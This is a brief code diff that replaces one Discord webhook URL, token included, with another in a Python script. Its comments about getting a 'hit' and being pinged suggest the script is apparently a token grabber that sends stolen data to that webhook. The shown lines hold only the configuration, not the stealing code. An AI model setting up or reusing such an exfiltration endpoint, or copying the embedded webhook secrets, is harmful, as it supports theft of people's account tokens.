@@ -5,7 +5,7 @@ import json
 from urllib.request import Request, urlopen
 
 # your webhook URL
-WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1185858532638199948/S1V6AcEOZPvVMEEKRtWyj7hZwEKP1xj69T6tQFcOHomohfZdD2fXjkG8zKDoM4w5fVBp'
+WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1188008280589602856/Cn7jkc4koFGz-BkWGOv7n3Dw4ZJME87LYAEBxtY3CW5IEM6-I_MvbWB7GUgzVTmPDaox'
 
 # mentions you when you get a hit
 PING_ME = False
